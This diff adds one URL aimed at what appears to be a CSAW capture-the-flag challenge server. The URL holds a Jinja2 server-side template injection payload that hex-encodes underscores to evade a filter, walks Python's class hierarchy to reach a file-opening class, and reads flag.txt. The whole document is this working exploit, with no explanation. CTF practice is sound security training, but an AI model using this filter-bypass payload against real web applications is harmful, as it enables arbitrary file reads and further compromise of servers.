@@ -1,0 +1,2 @@
+http://web.chal.csaw.io:5000/submit?value={{%22%22|attr(%22\x5f\x5fclass\x5f\x5f%22)|attr(%22mro%22)()|attr(%22\x5f\x5fgetitem\x5f\x5f%22)(2)|attr(%22\x5f\x5fsubclasses\x5f\x5f%22)()|attr(%22\x5f\x5fgetitem\x5f\x5f%22)(40)(%22flag.txt%22)|attr(%22read%22)()}}&class=class&usc=base&und=_
+
